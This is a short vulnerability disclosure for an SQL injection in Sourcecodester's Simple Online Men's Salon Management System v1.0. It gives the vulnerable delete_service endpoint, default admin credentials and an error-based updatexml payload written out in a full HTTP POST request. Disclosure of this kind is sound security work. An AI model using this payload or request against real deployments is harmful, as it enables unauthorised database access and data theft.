# Simple Online Men's Salon Management System v1.0 by Sourcecodester has SQL injection

Bug_author: Liu Lanling

vendors: https://www.sourcecodester.com/php/15069/simple-online-mens-salon-management-system-php-free-source-code.html

Login account:admin/admin123

dbname=msms_db

Vulnerability File: /msms/classes/Master.php?f=delete_service

Vulnerability location: /msms/classes/Master.php?f=delete_service, id

[+] Payload: id=3' and updatexml(1,concat(0x7e,database(),0x7e),1)# // Leak place ---> id

```sql
POST /msms/classes/Master.php?f=delete_service HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/msms/admin/?page=appointments
Content-Length: 56
Cookie: PHPSESSID=aql25isdr8lel085k89oteptif
Connection: close

id=3' and updatexml(1,concat(0x7e,database(),0x7e),1)#
```

<img width="1647" height="453" alt="image" src="https://github.com/user-attachments/assets/3d5bb0d6-cdb9-4eed-ac5d-c51ad190dc27" />
